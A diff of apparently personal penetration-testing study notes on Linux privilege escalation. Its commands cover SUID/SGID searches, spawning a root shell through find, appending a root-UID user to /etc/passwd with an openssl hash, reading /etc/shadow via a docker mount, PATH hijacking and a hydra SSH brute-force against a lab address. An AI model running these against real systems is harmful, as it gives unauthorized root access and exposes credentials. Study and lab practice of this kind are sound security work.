@@ -380,22 +380,71 @@ Contents
             https://www.exploit-db.com/docs/english/44592-linux-restricted-shell-bypass-guide.pdf
             http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
                         
-      4.1.2 SUID 
+      4.1.2 SUID/SGID  
+         user must have execute permission
+            find / -perm /4000 -ls 2>/dev/null        #look for x on the user execution bit.  #USER ID
+            find / -perm /2000 -ls 2>/dev/null        #Group id
+               which <binary>
+               su -
+               find . -exec /bin/bash \;
+         
             Copy /etc/passwd
             Use openssl to create hash 
                Syntax: openssl passwd -1 -salt pkong pass123  
             Put it on the bottom of passwd
                pkong:$1$pkong$iErBtt0Nj.89iMln0uMBn.:0:0:root/root:/bin/bash
-        
-      4.1.3 Manual
-         user enumeration
+            sudo
+               https://wiki.archlinux.org/index.php/sudo#Configuration
+               https://www.tecmint.com/10-most-dangerous-commands-you-should-never-execute-on-linux/
+               https://linux.die.net/man/5/sudoers
+               
+      4.1.3 sudo 
             id     --> what is running? 
+            sudo -l
                Anything suspicious?
                    https://gtfobins.github.io
                if docker     # https://www.hackingarticles.in/docker-privilege-escalation/
                   docker run -v /etc/:/mnt -it alpine
                   cd /mnt
-                  cat shadow
+                  cat /etc/shadow   
+      4.1.4 capability
+            getcap -r / 2>/dev/null
+            
+      4.1.5 cron
+            crontab -l
+            cat /etc/crontab
+      4.1.6 Writable folder
+            /tmp
+            /var/tmp
+            /dev/shm
+             find / -type d -perm /2 2>/dev/null -ls
+                  tmpfs = tempeorary file system. 
+                  noexec,nosuid
+             mount
+             
+      4.1.7  Dot in path
+             echo $PATH            #high jack the path
+             . in the path         #
+             export PATH="$HOME/bin:$PATH"
+             
+      4.1.8 Vunerlable software and services
+         #search for software that is running as root
+            ps aux
+            ps -elf
+            
+            netstat -antp
+            
+            uname -a
+            cat /etc/version
+            dmesg|grep linux
+            
+            
+            
+                
+                 
+      
+      4.1.4 Manual
+         user enumeration
             groups
             ps aux     --> Search for odd program, then searchsploit. 
                Linux Local Privilege Escalation via SUID /proc/pid/mem Write
@@ -416,19 +465,18 @@ Contents
                who logged in.
             w
             ls -lahR /home
-            find / -name "file name" 2>/dev/null
-            find / -perm -u=s -type f 2>/dev/null
+            find / -name "file name" -ls 2>/dev/null
+            find / -perm -u=s -type f -ls 2>/dev/null
             Use known credentials
                 e.g. Collect credential of mysql database.
                      Identify non-root user with high priviliege
                             cat /etc/passwd|grep -vE "nologin|false" 
                      Bruteforce SSH using the identified passwords and known users. 
                      hydra -l gibson -p zaq1xsw2cde3 10.11.1.71 ssh
-                     
-            sudo -l
-               list what sudo can do
              watch w
-               logged in users
+               logged in users                     
+
+
         System Enumeration
             ps aux
             ps -elf
@@ -493,7 +541,7 @@ Contents
                   $ echo $PATH
                   $ export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH
                   $ export SHELL=/bin/bash
-           find / -perm 4755 2>/dev/null
+           find / -perm /4755 -ls 2>/dev/null
                Copy /etc/passwd
                  Use openssl to create hash 
                         Syntax: openssl passwd -1 -salt pkong pass123  
